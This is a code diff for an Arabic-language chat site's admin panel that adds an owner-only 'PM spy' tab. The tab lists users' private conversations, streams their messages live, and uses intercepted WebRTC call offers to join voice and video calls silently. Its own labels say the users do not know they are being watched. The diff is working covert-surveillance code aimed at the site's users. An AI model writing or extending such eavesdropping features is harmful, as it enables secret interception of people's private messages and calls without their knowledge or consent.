@@ -955,6 +955,7 @@ body.theme-rose .btn-s{border-color:rgba(0,229,160,.2);}
     <button class="ap-tab" id="apt-words" onclick="apTab('words')">🚫 الكلمات</button>
     <button class="ap-tab" id="apt-quiz" onclick="apTab('quiz')">🏆 المسابقات</button>
     <button class="ap-tab" id="apt-perms" onclick="apTab('perms')" style="color:#ffd700;">🔐 الصلاحيات</button>
+    <button class="ap-tab" id="apt-spy" onclick="apTab('spy')" style="color:#f87171;">👁️ مراقبة الخاص</button>
   </div>
   <div class="abdy">
     <!-- TAB: MAIN (Members) -->
@@ -1112,6 +1113,57 @@ body.theme-rose .btn-s{border-color:rgba(0,229,160,.2);}
     </div>
     </div>
 
+    <!-- TAB: SPY PM -->
+    <div id="ap-sec-spy" style="display:none;">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px;">
+        <div>
+          <h3 style="color:#f87171;font-size:15px;margin:0 0 4px;">👁️ مراقبة المحادثات الخاصة</h3>
+          <p style="font-size:11px;color:var(--mut);margin:0;">تُحفظ الرسائل فقط طالما الخادم يعمل — تختفي عند إعادة التشغيل</p>
+        </div>
+        <button onclick="loadSpyConversations()" class="btn btn-g" style="padding:8px 14px;font-size:12px;">🔄 تحديث</button>
+      </div>
+      <div style="background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.15);border-radius:12px;padding:16px;margin-bottom:16px;">
+        <div style="font-size:12px;color:#f87171;margin-bottom:10px;font-weight:600;">🔍 مراقبة محادثة بين عضوين</div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <input type="text" id="spy-user1" class="fi" placeholder="الاسم الأول..." style="flex:1;min-width:120px;">
+          <input type="text" id="spy-user2" class="fi" placeholder="الاسم الثاني..." style="flex:1;min-width:120px;">
+          <button onclick="openSpyWindow()" class="btn btn-p" style="padding:10px 16px;font-size:12px;flex-shrink:0;">👁️ مراقبة</button>
+        </div>
+      </div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:10px;">💬 المحادثات المحفوظة في الجلسة الحالية:</div>
+      <div id="spy-conv-list" style="display:flex;flex-direction:column;gap:8px;max-height:300px;overflow-y:auto;"></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- SPY WINDOW MODAL -->
+<div id="spy-modal" style="display:none;position:fixed;inset:0;z-index:5000;background:rgba(0,0,0,.85);align-items:center;justify-content:center;">
+  <div style="background:#0a0f1e;border:1px solid rgba(239,68,68,.3);border-radius:20px;width:min(560px,96vw);max-height:92vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 0 40px rgba(239,68,68,.2);">
+    <!-- Header -->
+    <div style="padding:14px 18px;background:rgba(239,68,68,.08);border-bottom:1px solid rgba(239,68,68,.2);display:flex;align-items:center;gap:10px;flex-shrink:0;">
+      <span style="font-size:16px;">👁️</span>
+      <div style="flex:1;">
+        <div id="spy-title" style="font-size:14px;font-weight:700;color:#f87171;"></div>
+        <div style="display:flex;align-items:center;gap:6px;margin-top:2px;">
+          <div style="width:7px;height:7px;border-radius:50%;background:#f87171;animation:pulse 1.5s infinite;"></div>
+          <span style="font-size:11px;color:#4ade80;">مراقبة فعلية — المستخدمان لا يعلمان</span>
+        </div>
+      </div>
+      <button onclick="closeSpyModal()" style="background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#fff;border-radius:8px;padding:5px 14px;cursor:pointer;font-size:13px;font-family:'Cairo',sans-serif;">✕</button>
+    </div>
+    <!-- Call section (hidden until call starts) -->
+    <div id="spy-call-section" style="display:none;background:#000;flex-shrink:0;position:relative;min-height:180px;max-height:280px;">
+      <video id="spy-video" autoplay playsinline style="width:100%;height:100%;max-height:280px;object-fit:cover;display:none;"></video>
+      <audio id="spy-audio" autoplay style="display:none;"></audio>
+      <div style="position:absolute;top:8px;right:10px;background:rgba(0,0,0,.6);border-radius:8px;padding:4px 10px;">
+        <span id="spy-call-status" style="font-size:11px;color:#4ade80;"></span>
+      </div>
+      <div style="position:absolute;bottom:8px;left:10px;background:rgba(239,68,68,.2);border:1px solid rgba(239,68,68,.3);border-radius:8px;padding:4px 10px;font-size:11px;color:#f87171;">👁️ مراقبة خفية</div>
+    </div>
+    <!-- Messages -->
+    <div id="spy-msgs" style="flex:1;overflow-y:auto;padding:12px 14px;display:flex;flex-direction:column;gap:6px;min-height:150px;max-height:45vh;"></div>
+    <div id="spy-info" style="padding:8px 16px;border-top:1px solid rgba(255,255,255,.06);font-size:11px;color:#555;flex-shrink:0;"></div>
   </div>
 </div>
 
@@ -1875,18 +1927,18 @@ function closeAdmin(){document.getElementById('ap').classList.remove('on');}
 let _currentApTab = 'main';
 function apTab(name){
   _currentApTab = name;
-  ['main','rooms','words','quiz','perms'].forEach(t=>{
+  ['main','rooms','words','quiz','perms','spy'].forEach(t=>{
     const btn=document.getElementById('apt-'+t);
     const sec=document.getElementById('ap-sec-'+t);
     const sec2=document.getElementById('ap-sec-main2');
     if(btn) btn.classList.toggle('on', t===name);
     if(sec) sec.style.display = (t===name)?'block':'none';
-    // reset pass is in main tab
     if(sec2) sec2.style.display = (name==='main')?'block':'none';
   });
   if(name==='perms') renderPermsUI();
   if(name==='rooms') renderRoomAccessManager();
   if(name==='words') { loadBadWords && loadBadWords(); }
+  if(name==='spy') loadSpyConversations();
 }
 
 // ===== PERMISSIONS UI =====
@@ -2076,6 +2128,174 @@ function createNewRank(){
   }catch(e){}
 })();
 // ===== END CREATE RANK =====
+
+// ===== PM SPY SYSTEM =====
+let _spyUser1=null, _spyUser2=null, _spyPC=null, _spyStream=null;
+
+async function loadSpyConversations(){
+  const c=document.getElementById('spy-conv-list');
+  if(!c) return;
+  if(cu?.rank!=='owner'){
+    c.innerHTML='<p style="color:#f87171;font-size:13px;">⛔ هذه الصلاحية للمالك فقط.</p>';
+    return;
+  }
+  c.innerHTML='<p style="color:#888;font-size:12px;">جارٍ التحميل...</p>';
+  try{
+    const r=await fetch('/api/admin/pm-conversations',{headers:{'x-admin-token':AK}});
+    const d=await r.json();
+    if(!d.ok){ c.innerHTML='<p style="color:#f87171;font-size:12px;">❌ خطأ</p>'; return; }
+    if(!d.conversations.length){
+      c.innerHTML='<p style="color:var(--mut);font-size:12px;">لا توجد محادثات خاصة في هذه الجلسة بعد.</p>';
+      return;
+    }
+    c.innerHTML='';
+    d.conversations.forEach(conv=>{
+      const div=document.createElement('div');
+      const hasCall=conv.hasActiveCall;
+      div.style.cssText='background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:10px;padding:12px 14px;display:flex;align-items:center;gap:12px;transition:.2s;';
+      div.onmouseover=function(){this.style.background='rgba(239,68,68,.12)';};
+      div.onmouseout=function(){this.style.background='rgba(239,68,68,.06)';};
+      div.innerHTML=`
+        <div style="flex:1;">
+          <div style="font-size:13px;font-weight:700;color:#f87171;">${conv.users[0]} ↔ ${conv.users[1]}</div>
+          <div style="font-size:11px;color:var(--mut);margin-top:2px;">${conv.count} رسالة${conv.lastTime?' · '+conv.lastTime:''}</div>
+          ${hasCall?`<div style="font-size:11px;color:#4ade80;margin-top:3px;display:flex;align-items:center;gap:4px;"><span style="width:7px;height:7px;background:#4ade80;border-radius:50%;animation:pulse 1s infinite;display:inline-block;"></span>${conv.callType==='video'?'📹 مكالمة فيديو نشطة':'📞 مكالمة صوتية نشطة'}</div>`:''}
+        </div>
+        <button onclick="spyOn('${conv.users[0]}','${conv.users[1]}')" style="background:${hasCall?'rgba(74,222,128,.2)':'rgba(239,68,68,.2)'};color:${hasCall?'#4ade80':'#f87171'};border:1px solid ${hasCall?'rgba(74,222,128,.3)':'rgba(239,68,68,.3)'};border-radius:8px;padding:6px 12px;cursor:pointer;font-size:12px;font-family:'Cairo',sans-serif;flex-shrink:0;">${hasCall?'📹 دخول المكالمة':'👁️ مراقبة'}</button>`;
+      c.appendChild(div);
+    });
+  }catch(e){ c.innerHTML='<p style="color:#f87171;font-size:12px;">❌ خطأ في التحميل</p>'; }
+}
+
+function openSpyWindow(){
+  const u1=document.getElementById('spy-user1')?.value.trim();
+  const u2=document.getElementById('spy-user2')?.value.trim();
+  if(!u1||!u2){ toast('❌ أدخل اسمي المستخدمين','e'); return; }
+  if(u1===u2){ toast('❌ اسمان مختلفان مطلوبان','e'); return; }
+  spyOn(u1,u2);
+}
+
+function spyOn(user1,user2){
+  if(cu?.rank!=='owner'){ toast('⛔ للمالك فقط','e'); return; }
+  // Leave previous
+  if(_spyUser1&&_spyUser2) socket.emit('spy-leave',{user1:_spyUser1,user2:_spyUser2});
+  _stopSpyCall();
+  _spyUser1=user1; _spyUser2=user2;
+  document.getElementById('spy-title').textContent=user1+' ↔ '+user2;
+  document.getElementById('spy-call-section').style.display='none';
+  document.getElementById('spy-call-status').textContent='لا توجد مكالمة نشطة';
+  document.getElementById('spy-msgs').innerHTML='<div style="color:#555;font-size:12px;text-align:center;padding:20px;">جارٍ التحميل...</div>';
+  document.getElementById('spy-modal').style.display='flex';
+  socket.emit('spy-join',{user1,user2});
+}
+
+function closeSpyModal(){
+  if(_spyUser1&&_spyUser2) socket.emit('spy-leave',{user1:_spyUser1,user2:_spyUser2});
+  _stopSpyCall();
+  _spyUser1=null; _spyUser2=null;
+  document.getElementById('spy-modal').style.display='none';
+}
+
+function _stopSpyCall(){
+  if(_spyPC){ _spyPC.close(); _spyPC=null; }
+  if(_spyStream){ _spyStream.getTracks().forEach(t=>t.stop()); _spyStream=null; }
+  const sv=document.getElementById('spy-video');
+  if(sv){ sv.srcObject=null; sv.style.display='none'; }
+}
+
+async function _startSpyPC(offer){
+  _stopSpyCall();
+  try{
+    _spyPC=new RTCPeerConnection(ICE);
+    // Receive only — no mic/camera
+    _spyPC.ontrack=e=>{
+      _spyStream=e.streams[0];
+      const sv=document.getElementById('spy-video');
+      if(sv){ sv.srcObject=_spyStream; sv.style.display='block'; sv.play().catch(()=>{}); }
+      document.getElementById('spy-call-section').style.display='block';
+      document.getElementById('spy-call-status').textContent='🔴 مراقبة فعلية — مباشر';
+    };
+    _spyPC.onicecandidate=e=>{
+      // We don't send ICE to anyone — we're passive observer
+    };
+    _spyPC.onconnectionstatechange=()=>{
+      const st=_spyPC?.connectionState;
+      if(st==='disconnected'||st==='failed'||st==='closed'){
+        document.getElementById('spy-call-section').style.display='none';
+        document.getElementById('spy-call-status').textContent='انتهت المكالمة';
+      }
+    };
+    // Set remote description from the offer we intercepted
+    await _spyPC.setRemoteDescription(new RTCSessionDescription(offer));
+    // Create answer (won't be sent — just to complete handshake internally)
+    const answer=await _spyPC.createAnswer();
+    await _spyPC.setLocalDescription(answer);
+    // Note: we don't emit call-answer — we silently listen
+  }catch(e){ console.error('Spy PC error:',e); }
+}
+
+function renderSpyMsg(pm){
+  const c=document.getElementById('spy-msgs');
+  if(!c) return;
+  // Remove loading placeholder
+  const placeholder=c.querySelector('[data-placeholder]');
+  if(placeholder) placeholder.remove();
+  const isLeft=pm.from===_spyUser1;
+  const nc=RK_COLOR[pm.fromRank]||'#b0bec5';
+  const d=document.createElement('div');
+  d.style.cssText='display:flex;flex-direction:column;align-items:'+(isLeft?'flex-start':'flex-end')+';margin-bottom:4px;';
+  d.innerHTML=`<div style="max-width:80%;background:${isLeft?'rgba(239,68,68,.1)':'rgba(255,255,255,.05)'};border:1px solid ${isLeft?'rgba(239,68,68,.2)':'rgba(255,255,255,.1)'};border-radius:${isLeft?'4px 14px 14px 14px':'14px 4px 14px 14px'};padding:8px 12px;">
+    <div style="font-size:11px;color:${nc};font-weight:700;margin-bottom:3px;">${esc(pm.from)}</div>
+    <div style="font-size:13px;color:#e0e0e0;line-height:1.5;">${esc(pm.text||'')}</div>
+    <div style="font-size:10px;color:#555;margin-top:4px;">${pm.time||''}</div>
+  </div>`;
+  c.appendChild(d);
+  c.scrollTop=c.scrollHeight;
+}
+
+// Socket listeners for spy
+socket.on('spy-history',(d)=>{
+  const c=document.getElementById('spy-msgs');
+  if(!c) return;
+  c.innerHTML='';
+  if(!d.messages.length){
+    const p=document.createElement('div');
+    p.setAttribute('data-placeholder','1');
+    p.style.cssText='color:#555;font-size:12px;text-align:center;padding:20px;';
+    p.textContent='لا توجد رسائل محفوظة بعد. المراقبة الفعلية تعمل 🔴';
+    c.appendChild(p);
+  } else {
+    d.messages.forEach(m=>renderSpyMsg(m));
+  }
+  const info=document.getElementById('spy-info');
+  if(info) info.textContent=d.messages.length+' رسالة محفوظة · تحديث فوري للرسائل الجديدة';
+});
+
+socket.on('spy-pm',(pm)=>{
+  if(document.getElementById('spy-modal').style.display==='none') return;
+  if(pm.from===_spyUser1||pm.from===_spyUser2||pm.to===_spyUser1||pm.to===_spyUser2) renderSpyMsg(pm);
+});
+
+socket.on('spy-call-offer',(d)=>{
+  if(document.getElementById('spy-modal').style.display==='none') return;
+  document.getElementById('spy-call-section').style.display='block';
+  document.getElementById('spy-call-status').textContent='⏳ مكالمة '+( d.type==='video'?'فيديو':'صوتية')+' بدأت — جارٍ الاتصال...';
+  _startSpyPC(d.offer);
+});
+
+socket.on('spy-call-active',(d)=>{
+  // Already active call when we join spy room
+  document.getElementById('spy-call-section').style.display='block';
+  document.getElementById('spy-call-status').textContent='📞 مكالمة '+(d.type==='video'?'فيديو':'صوتية')+' نشطة — الدخول قد يكون متأخراً';
+});
+
+socket.on('spy-call-ended',()=>{
+  _stopSpyCall();
+  document.getElementById('spy-call-section').style.display='none';
+  document.getElementById('spy-call-status').textContent='⚫ انتهت المكالمة';
+  toast('📵 انتهت مكالمة المراقبة','k');
+});
+// ===== END SPY SYSTEM =====
 
 // ===== ROOM ACCESS MANAGER =====
 function renderRoomAccessManager(){
